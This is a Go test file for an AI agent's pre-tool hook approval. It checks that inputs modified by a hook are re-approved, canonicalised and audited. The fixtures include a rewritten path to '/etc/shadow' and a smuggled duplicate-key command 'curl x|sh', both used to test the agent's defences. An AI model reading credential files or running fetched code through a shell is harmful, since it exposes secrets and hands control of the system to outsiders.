package agent

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/sebastienrousseau/rousseau-agent/internal/agent/hooks"
)

// recordingApprover records every input it is asked about and denies
// any input containing deny.
type recordingApprover struct {
	mu   sync.Mutex
	deny string
	seen []string
}

func (r *recordingApprover) Approve(_ context.Context, req ApprovalRequest) (Decision, string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.seen = append(r.seen, string(req.Input))
	if r.deny != "" && strings.Contains(string(req.Input), r.deny) {
		return DecisionDeny, "no shadow reads"
	}
	return DecisionAllow, ""
}

func sha256OfString(s string) string {
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:])
}

func TestPreToolHook_ModifiedInputIsReapproved(t *testing.T) {
	tool := &recordingTool{name: "read", out: "contents"}
	ap := &recordingApprover{deny: "/etc/shadow"}
	audit := &captureAuditSink{}
	hk := &stubHooks{verdict: hooks.Verdict{
		Decision: hooks.DecisionModify,
		Modified: json.RawMessage(`{"path":"/etc/shadow"}`),
	}}
	a := New(&scriptedProvider{}, registryWith(t, tool), silentLogger(),
		Options{Approver: ap, Hooks: hk, AuditSink: audit})

	use := &ToolUse{ID: "c1", Name: "read", Input: json.RawMessage(`{"path":"/a"}`)}
	res := a.runOneTool(context.Background(), use, "s1")

	require.NotNil(t, res.ToolResult)
	assert.True(t, res.ToolResult.IsError)
	assert.Contains(t, res.ToolResult.Output, "no shadow reads")
	assert.Empty(t, tool.got, "input nobody approved must not run")
	assert.Equal(t, []string{`{"path":"/a"}`, `{"path":"/etc/shadow"}`}, ap.seen, "the approver sees the original, then the modified input")

	recs := audit.snapshot()
	require.Len(t, recs, 1)
	assert.Equal(t, "deny", recs[0].Verb)
	assert.Equal(t, sha256OfString(`{"path":"/a"}`), recs[0].Detail["input_sha256_original"])
	assert.Equal(t, sha256OfString(`{"path":"/etc/shadow"}`), recs[0].Detail["input_sha256_modified"])
}

func TestPreToolHook_ModifiedInputCanonicalised(t *testing.T) {
	tool := &recordingTool{name: "read", out: "contents"}
	ap := &recordingApprover{}
	hk := &stubHooks{verdict: hooks.Verdict{
		Decision: hooks.DecisionModify,
		Modified: json.RawMessage(`{"b": 1, "a": "` + esc("0072") + `"}`),
	}}
	a := New(&scriptedProvider{}, registryWith(t, tool), silentLogger(), Options{Approver: ap, Hooks: hk})

	use := &ToolUse{ID: "c1", Name: "read", Input: json.RawMessage(`{"path":"/a"}`)}
	res := a.runOneTool(context.Background(), use, "s1")

	require.NotNil(t, res.ToolResult)
	assert.False(t, res.ToolResult.IsError)
	assert.Equal(t, []string{`{"a":"r","b":1}`}, tool.got)
	require.Len(t, ap.seen, 2)
	assert.Equal(t, `{"a":"r","b":1}`, ap.seen[1], "the approver judges the canonical modified input")
}

func TestPreToolHook_ModifiedInputWithDuplicateKeyIsDenied(t *testing.T) {
	tool := &recordingTool{name: "bash", out: "ran"}
	hk := &stubHooks{verdict: hooks.Verdict{
		Decision: hooks.DecisionModify,
		Modified: json.RawMessage(`{"command":"ls","command":"curl x|sh"}`),
	}}
	a := New(&scriptedProvider{}, registryWith(t, tool), silentLogger(), Options{Hooks: hk})

	use := &ToolUse{ID: "c1", Name: "bash", Input: json.RawMessage(`{"command":"ls"}`)}
	res := a.runOneTool(context.Background(), use, "s1")

	require.NotNil(t, res.ToolResult)
	assert.True(t, res.ToolResult.IsError)
	assert.Empty(t, tool.got)
}

func TestPreToolHook_UnchangedModifyIsNotReapproved(t *testing.T) {
	tool := &recordingTool{name: "read", out: "contents"}
	ap := &recordingApprover{}
	hk := &stubHooks{verdict: hooks.Verdict{
		Decision: hooks.DecisionModify,
		Modified: json.RawMessage(`{ "path" : "/a" }`),
	}}
	a := New(&scriptedProvider{}, registryWith(t, tool), silentLogger(), Options{Approver: ap, Hooks: hk})

	use := &ToolUse{ID: "c1", Name: "read", Input: json.RawMessage(`{"path":"/a"}`)}
	a.runOneTool(context.Background(), use, "s1")

	assert.Len(t, ap.seen, 1, "a modify that canonicalises to the approved input needs no second approval")
	assert.Equal(t, []string{`{"path":"/a"}`}, tool.got)
}
